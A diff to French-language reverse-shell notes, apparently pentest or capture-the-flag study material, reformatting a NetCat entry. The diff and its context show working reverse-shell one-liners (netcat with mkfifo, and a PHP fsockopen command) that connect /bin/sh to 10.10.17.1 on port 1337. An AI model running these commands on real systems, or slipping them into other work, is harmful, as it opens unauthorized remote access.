@@ -40,7 +40,8 @@ Par exemple, pour vérifier l'utilisateur actuel, vous pouvez taper : `whoami`
 # Autres reverse shell
 [invicti.com/learn/reverse-shell](https://www.invicti.com/learn/reverse-shell/)
 ## NetCat
-`ncat -l -p 1337` ou `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f`
+- `ncat -l -p 1337`
+- ou `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f`
 ## PHP
 `php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`
 ## Java
